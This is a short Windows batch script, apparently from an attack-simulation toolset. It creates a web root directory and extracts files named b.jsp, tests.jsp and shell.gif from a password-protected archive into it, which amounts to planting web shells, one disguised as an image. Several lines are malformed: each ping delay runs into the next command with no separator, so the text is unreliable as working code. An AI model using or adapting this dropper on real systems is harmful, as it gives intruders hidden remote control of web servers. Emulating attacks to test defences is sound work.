@ECHO OFF

ECHO ===========================================================================
ECHO WEBSHELLS
ECHO Dropping web shell in new WWW directory
ping -n 5 127.0.0.1 > NUL MKDIR "%WWWROOT%"
ping -n 5 127.0.0.1 > NUL "%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%WWWROOT%" toolset\b.jsp > NUL
ping -n 5 127.0.0.1 > NUL "%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%WWWROOT%" toolset\tests.jsp > NUL
ping -n 5 127.0.0.1 > NUL "%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%WWWROOT%" toolset\shell.gif > NUL
